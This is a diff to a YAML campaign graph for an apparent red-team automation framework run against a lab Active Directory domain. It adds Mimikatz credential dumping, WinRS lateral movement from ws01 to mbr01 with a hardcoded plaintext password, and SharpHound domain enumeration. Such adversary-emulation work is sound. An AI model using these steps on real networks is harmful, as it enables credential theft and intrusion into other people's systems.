@@ -1,10 +1,12 @@
-# CADRE-owned campaign graph (Plan 1.1 M5).
+# CADRE-owned campaign graph (Plan 1.1 M5 / v7 lateral-movement update).
 # Engine is generic RedStrike; this file + seeds + lab-profiles are CADRE glue.
 # branch: spine | A | B | C | D | E | F | G | sql-ai
 # path: ws01 | linux60 | stage_mbr01 | external60_phase0
 # hitl_gate: dcsync | ticket | forest | persistence | acl_write | site_takeover
+# pivot_to: target machine/role for lateral movement (ws01 -> mbr01 -> dc02 -> dc01 -> range.local)
+# produces_beachhead: credential or machine beachhead created by this node
 # Streams: E = phase 9 (network defense), F = phase 10 (supply-chain) — no ws01 routing
-version: 5
+version: 7
 name: cadre-campaign-m5
 # M4+: prefer typed `intent` when set; `script` remains harness fallback (--prefer-script).
 nodes:
@@ -95,8 +97,29 @@ nodes:
     path: ws01
     beachheads: [windows, linux]
     script: campaign-a/T035-creds-ws01.sh
+    intent: mimikatz.logonpasswords
+    intent_args:
+      privilege_debug: true
     requires_cred: analyst_t1
     produces_cred: null
+
+  - id: T101
+    phase: 3.5
+    branch: spine
+    title: Lateral movement — WinRS from ws01 to mbr01 as analyst_t1
+    path: ws01
+    beachheads: [windows, linux]
+    script: campaign-a/T101-winrs-pivot-ws01.sh
+    intent: winrs.command
+    intent_args:
+      target: 192.168.77.22
+      command: hostname; whoami /user
+      username: child.cadre.local\analyst_t1
+      password: T13r_An@lyst!
+    requires_cred: analyst_t1
+    produces_cred: null
+    pivot_to: mbr01
+    produces_beachhead: mbr01_analyst_t1
 
   - id: T004-BH
     phase: 4
@@ -105,8 +128,15 @@ nodes:
     path: ws01
     beachheads: [windows, linux]
     script: campaign-a/T004-bh-ws01.sh
+    intent: winrs.command
+    intent_args:
+      target: ws01
+      command: "mkdir C:\\Tools\\ADTools\\T004-bh-out; C:\\Tools\\ADTools\\BloodHound-master\\Collectors\\SharpHound.exe -c DCOnly -d child.cadre.local -domaincontroller dc02.child.cadre.local -outputdirectory C:\\Tools\\ADTools\\T004-bh-out"
+      username: child.cadre.local\analyst_t1
+      password: T13r_An@lyst!
     requires_cred: analyst_t1
     produces_cred: null
+    hitl_gate: null
 
   - id: T017
     phase: 5
@@ -313,6 +343,7 @@ nodes:
     path: ws01
     beachheads: [windows, linux]
     script: campaign-a/T053-unpac-thehash-ws01.sh
+    stub: true
     requires_cred: analyst_t1
     produces_cred: null
 
